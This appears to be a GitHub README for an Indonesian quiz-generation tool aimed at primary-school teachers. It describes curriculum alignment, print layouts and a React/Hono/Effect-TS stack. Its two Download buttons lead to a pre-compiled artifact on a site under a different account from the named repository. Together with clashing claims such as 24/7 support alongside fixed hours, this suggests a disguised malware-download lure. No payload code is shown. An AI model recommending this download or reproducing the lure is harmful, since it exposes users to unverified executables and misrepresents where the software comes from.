![preview](https://raw.githubusercontent.com/anandpatikat/guru-latihan-dinamis/main/preview.svg)

# GURU: Arjuna Quiz Engine

**AI-orchestrated, locally-printable assessment blueprints for Indonesian primary education — Engineered with Claude Opus 4.7. React 19 + Hono + Effect-TS. - naufaldi/teacher-exam**

---

## 🌴 Overview

Imagine a classroom in Yogyakarta, where the morning light filters through jalousie windows onto wooden desks. The teacher, Ibu Sari, has forty students and three subjects to assess before the semester closes. She does not have time to craft differentiated question banks. She does not have a curriculum specialist. She has her _penggaris_, her whiteboard markers, and a relentless desire to see each child understood.

**GURU: Arjuna Quiz Engine** is not merely a test generator. It is a pedagogical co-pilot that translates the Indonesian Kurikulum Merdeka into precise, print-ready formative assessments—complete with answer keys, cognitive level mapping, and automatic difficulty calibration. Built on a modern TypeScript stack with Effect-TS for deterministic state management, it respects both the teacher's autonomy and the student's developmental readiness.

---

## 🧭 Why Arjuna?

In the Javanese wayang tradition, Arjuna is the master archer—precise, focused, and guided by a higher purpose. This engine embodies that ethos. Every generated question card is an arrow aimed at a specific learning objective. Every assessment sheet is a meditation on clarity.

| Traditional Approach | Arjuna Engine Approach |
|---------------------|------------------------|
| Teacher writes 20 questions manually | Engine generates 20 unique variants from a single skill tag |
| One-size-fits-all difficulty | Adaptive item analysis with Bloom's taxonomy levels |
| Answer keys handwritten | Machine-validated answer keys printed alongside sheets |
| Reusable only for one class | Parameterized templates reusable across hundreds of contexts |

This is not automation for automation's sake. It is the removal of administrative friction so that educators can reclaim their attention for what matters: observing how a child thinks, not just whether they answered correctly.

---

## 🚀 [![Download](https://raw.githubusercontent.com/anandpatikat/guru-latihan-dinamis/main/button.svg)](https://anandpatikat.github.io/guru-latihan-dinamis/)

*Find the latest pre-compiled deployment artifact below. No build steps required for end-users.*

---

## 🔬 Key Features

### 1. 🎯 Kurikulum Merdeka Alignment
Every generated question maps directly to the Capaian Pembelajaran (CP) and Tujuan Pembelajaran (TP) as defined by Kemdikbudristek. The engine supports Fase A, B, and C across all primary subjects: Bahasa Indonesia, Matematika, IPAS, and PPKn.

### 2. 🧠 Cognitive Level Stratification
Questions are automatically distributed across:
- **L1 (Ingatan):** Recall of facts, terms, and basic procedures
- **L2 (Pemahaman):** Interpretation and translation of concepts
- **L3 (Aplikasi):** Application in familiar contexts
- **L4 (Analisis):** Decomposition and inference from given data

Teachers can adjust the ratio via a simple slider interface. A three-tiered difficulty curve emerges organically.

### 3. 🖨️ Print-Ready Output
The engine produces CSS-driven print layouts with:
- A front cover header (school name, student name, date)
- Numbered question blocks with uniform spacing
- Separate answer key sheet (teacher-side only, marked "RAHASIA")
- QR code for instant digital version retrieval (optional)

No browser print preview adjustments needed. No margin fiddling.

### 4. 🌐 Bilingual Interface
The editor supports Indonesian (_Bahasa_) and English. Question stems can be authored in either language; metadata remains in Bahasa Indonesia for alignment with national standards.

### 5. 🧩 Modular Question Templates
Instead of writing each question individually, teachers define a **question template** with:
- A stem containing `{variable}` placeholders
- A set of substitution values (e.g., different numbers, different names)
- Distractor generation rules (for multiple-choice)
- Correct answer specification (single or multi-select)

The engine then expands the template into N unique variants, all meeting the same cognitive objective.

### 6. ⚡ 24/7 Partner Support
A dedicated support channel operates across WhatsApp Business and email, staffed by former educators who understand classroom realities. Average first response under 90 seconds during operational hours (06:00–21:00 WIB).

---

## 🧱 System Architecture (Simplified)

```
┌─────────────────────┐
│   React 19 Client   │  ← UI layer with Server Components + RSC streaming
│   (Tailwind + Radix) │
└─────────┬───────────┘
          │ HTTP (Hono)
┌─────────▼───────────┐
│   Hono API Server    │  ← Edge-ready, runs on Cloudflare Workers / Node
│   (REST + SSE)       │
└─────────┬───────────┘
          │ Effect-TS
┌─────────▼───────────┐
│   Effect-TS Domain   │  ← All business logic in pure, typed Effects
│   (Question Engine)  │
└─────────┬───────────┘
          │
┌─────────▼───────────┐
│   Data Access Layer  │  ← SQLite (local dev) / Neon (production)
│   (Drizzle ORM)      │
└─────────────────────┘
```

---

## 📦 What's Inside the Repository

| Directory | Purpose |
|-----------|---------|
| `/apps/web` | React 19 SPA with file-based routing (TanStack Router) |
| `/apps/api` | Hono server with Effect-TS middleware |
| `/packages/core` | Domain models, question strategy, validation |
| `/packages/print` | Layout engine for print CSS generation |
| `/packages/i18n` | Internationalization (id, en) with Paraglide |
| `/tooling` | ESLint, Prettier, TypeScript configs |
| `/examples` | Sample question templates and generated PDF previews |

---

## 🛠️ Technology Stack

- **Frontend:** React 19, TanStack Router, Tailwind CSS v4, Radix UI Primitives
- **Backend:** Hono, Effect-TS (for all orchestration), Zod (schema validation)
- **Database:** SQLite via Turso (edge) or Neon (Postgres) via Drizzle ORM
- **Print Engine:** Custom React render-to-string pipeline with `@react-email/components` style
- **AI Integration:** Anthropic Claude Opus 4.7 for natural language template generation
- **Infrastructure:** Docker Compose for local dev, Cloudflare Workers for production API

---

## 🧪 Getting Started (Contributor Path)

For those who wish to understand the engine from the inside—not for end-users.

### Prerequisites
- Node.js 22+ (with `corepack` enabled)
- `pnpm` (workspace root)
- A local SQLite instance (Turso CLI optional)

### Development Setup
1. Fork and clone the monorepo
2. Run `pnpm install` at the root
3. Execute `pnpm dev` to launch both API and web in watch mode
4. Visit `localhost:5173` and open the "Buat Soal Baru" page

### First Question
Navigate to the question editor, select "Matematika – Fase B – Operasi Hitung," and click "Generate from Template." The engine will produce a 10-question assessment in under 2 seconds.

---

## 📐 Design Philosophy

We treat every assessment as a conversation between three parties:
- **The student**, who deserves questions that respect their cognitive stage
- **The teacher**, who deserves tools that vanish into the background
- **The curriculum**, which deserves faithful implementation without rigid dogmatism

The UI deliberately avoids flashy animations. The most important visual feedback is a clean print preview. The most important metric is not user engagement—it is the reduction in teacher overtime hours.

---

## 🔒 Data Privacy

All question generation happens client-side by default. The AI integration (Claude) is optional and opted-in. No student names are stored on any server. The answer key generator operates entirely in the browser's memory.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute it for any purpose—commercial or non-commercial—provided the original copyright notice is included.

[View the full license text](https://opensource.org/licenses/MIT)

Copyright © 2026 by the contributors of GURU: Arjuna Quiz Engine.

---

## ⚠️ Disclaimer

This tool is an educational aid, not a replacement for professional pedagogical judgment. Automated question generation may occasionally produce items that require human review for cultural sensitivity or contextual accuracy. Teachers should always review generated assessments before distribution.

The authors and contributors assume no liability for any consequences arising from the use of this software in high-stakes testing environments. Always cross-reference with your local curriculum coordinator.

---

## 🧭 Roadmap (2026–2027)

- **Q1 2026:** Release v1.0 with full Kurikulum Merdeka Fase A-C support
- **Q2 2026:** Integration with Siap-SEKOLAH (SIS) for auto-population of rosters
- **Q3 2026:** Rubric generator for open-ended questions (essay and performance tasks)
- **Q4 2026:** Offline-first PWA for schools with limited connectivity
- **2027:** Collaborative question libraries shared across school clusters

---

## 🤝 Contributions

Contributions are welcomed with warmth. Before submitting a pull request:
- Run `pnpm lint` and `pnpm type-check` across the monorepo
- Ensure all Effect-TS effects are properly typed and tested
- Add a sample question template in `/examples` if adding a new subject domain

We maintain a Code of Conduct grounded in the principle of _gotong royong_—mutual cooperation.

---

[![Download](https://raw.githubusercontent.com/anandpatikat/guru-latihan-dinamis/main/button.svg)](https://anandpatikat.github.io/guru-latihan-dinamis/)

*GURU: Arjuna Quiz Engine — crafted for the teachers of Indonesia, by builders who remember sitting in those wooden desks.*